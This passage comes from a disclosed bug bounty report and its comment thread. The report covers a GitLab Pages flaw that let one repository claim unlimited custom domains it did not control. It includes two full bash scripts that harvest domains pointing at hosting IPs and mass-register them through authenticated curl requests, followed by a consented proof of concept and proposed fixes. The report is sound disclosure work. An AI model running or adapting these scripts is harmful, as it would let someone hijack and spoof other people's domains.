GitLab allows setting an unlimited number of domains for a single repository. \n\nFirst, I wrote a fully-fledged exploit that hijacks unclaimed domains. In under 5s I managed to secure 110 domains.\n\n```bash\n#!/bin/bash\n\nsearches=(\n    \"The resource that you are attempting to access does not exist or you don't have the necessary permissions to view it.\"\n)\n\ngron \"https://app.securitytrails.com/api/search/by_type/ip/52.167.214.135\" | fgrep \"domain\" | grep -o '\"[^\"]\\+\"' | cut -d '\"' -f 2 \u003e whiteknight-temp\n\nwhile read domain; do\n    if host \"$domain\"\u003e /dev/null; then\n        echo $domain;\n    fi;\ndone \u003c whiteknight-temp \u003e\u003e domains\n\ncat domains | uniq | sed -e 's/^/https:\\/\\//' \u003e\u003e domains-to-test\n\nmeg / domains-to-test\n\nfor str in \"${searches[@]}\"; do\n    grep --color -Hnri \"$str\" out/\ndone\n\nwhile read target; do\n    curl --silent 'https://gitlab.com/███████████████████/███████████████████/pages/domains' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --compressed -H 'Accept-Language: en-GB,en;q=0.5' -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: _gitlab_session=███████████████████; sidebar_collapsed=false' -H 'DNT: 1' -H 'Host: gitlab.com' -H 'Pragma: no-cache' -H 'Referer: https://gitlab.com/edoverflow-gitlab/hakyll/pages/domains/new' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0' --data \"utf8=✓\u0026authenticity_token=████████████████\u0026pages_domain[domain]=$target\u0026pages_domain[certificate]\u0026pages_domain[key]\"\ndone \u003c domains\n\ngio trash whiteknight-temp domains domains-to-test out/\n```\n\nThen I modified the script to gather any domain and add it to my repository. This means that as soon as someone points their domain to `52.167.214.135`, my repository will hijack their domain, and serve content on that domain. This prevents the user from even creating a repository on GitLab with that domain.\n\n```bash\n#!/bin/bash\n\nIPS=(\n    # GitLab\n    \"52.167.214.135\"\n    # GitHub\n    \"192.30.252.153\"\n    \"192.30.252.154\"\n    # Shopify\n    \"23.227.38.32\"\n)\n\nfor ip in \"${IPS[@]}\"; do\n    gron \"https://app.securitytrails.com/api/search/by_type/ip/$ip\" | fgrep \"domain\" | grep -o '\"[^\"]\\+\"' | cut -d '\"' -f 2 \u003e whiteknight-temp\ndone\n\nwhile read domain; do\n    if host \"$domain\"\u003e /dev/null; then\n        echo $domain;\n    fi;\ndone \u003c whiteknight-temp \u003e\u003e domains\n\nwhile read target; do\n    curl --silent 'https://gitlab.com/███████████████████/███████████████████/pages/domains' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --compressed -H 'Accept-Language: en-GB,en;q=0.5' -H 'Cache-Control: no-cache' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: _gitlab_session=███████████████████; sidebar_collapsed=false' -H 'DNT: 1' -H 'Host: gitlab.com' -H 'Pragma: no-cache' -H 'Referer: https://gitlab.com/edoverflow-gitlab/hakyll/pages/domains/new' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0' --data \"utf8=✓\u0026authenticity_token=███████████████████\u0026pages_domain[domain]=$target\u0026pages_domain[certificate]\u0026pages_domain[key]\"\ndone \u003c domains\n\ngio trash whiteknight-temp domains domains-to-test out/\n```\n\nPlease note that you could just extract a bunch of domains from the Alexa or randomly from the web, I just use `securitytrails.com` to demonstrate the issue without affecting your users.\n\n# Proof of concept\n\nWith my colleague's permission, I asked them to set an A record for their personal domain (http://danfield.photography/) pointing to `52.167.214.135`. They set the A record **after** I had added their domain to my repository. After a couple of minutes, their domain was serving my repository's content.\n\n# Mitigation\n\nSince this is a logic flaw, there will be multiple ways to mitigate the issue.\n\n1. You could restrict repositories to only a single custom domain — this is what GitHub does.\n2. Require users to place a randomly generated string as a TXT record on their domain when confirming ownership of the domain.\n3. Not store the domain until it actually points to `52.167.214.135` — currently you store any domain pointing to various other services and IPs.\n\n## Impact\n\nGitLab allows unrestricted mass-scale monitoring and claiming of domains. This attack can be performed in mere seconds.","bounty_amount":"750.0","formatted_bounty":"$750","weakness":{"id":65,"name":"Business Logic Errors"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-03-23T23:46:09.454Z","allow_singular_disclosure_after":-112114640.16233769,"singular_disclosure_allowed":true,"vote_count":33,"voters":["jokebookservice1","sp1d3rs","europa","ramsexy","muon4","bogdantcaciuc","bl4de","yumi","003random","emitrani","and 23 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2353590,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @edoverflow,\n\nThank you for submitting this report.

This issue is quite prevalent, but normally you do not report the issue to the service the vendor is serving their content on, but rather the vendor themselves. See https://hackerone.com/reports/263902 where I reported 5 subdomain takeovers to the TTS where their subdomains were pointing to GitHub.\n\nThis type of issue is caused by the user and not the vendor, therefore I fully agree with Brian's conclusion. What surprised me about that report is the fact that you disclosed it without notifying affected users. In fact, I recreated the exploit and added a small trick where I check the apex domain and the `www.` subdomain to increase the pool of vulnerable users to 700.\n\n**#312118 (this report)**\n\nThis report is about squatting domains **before** they even point to GitLab, preventing the user from using their custom domain, and serving content on their domain. This issue is in fact caused by GitLab and **not** the user.\n\n1. You should not allow registering an unlimited number of (sub)domains for a single repository;\n2. You should not allow users to add domains that are not already pointing to `52.167.214.135`;\n3. You should validate the domain when a user adds the domain to their repository.\n\nAdmittedly, you might kill two birds with one stone when using my proposed fix, but that does not mean it is the same issue at all. My finding is more in-depth and therefore requires fixing #296907 in the process too.","automated_response":false,"created_at":"2018-02-08T10:05:01.447Z","updated_at":"2018-02-08T10:05:01.447Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2363416,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @edoverflow,\n\nThanks the detailed clarification.
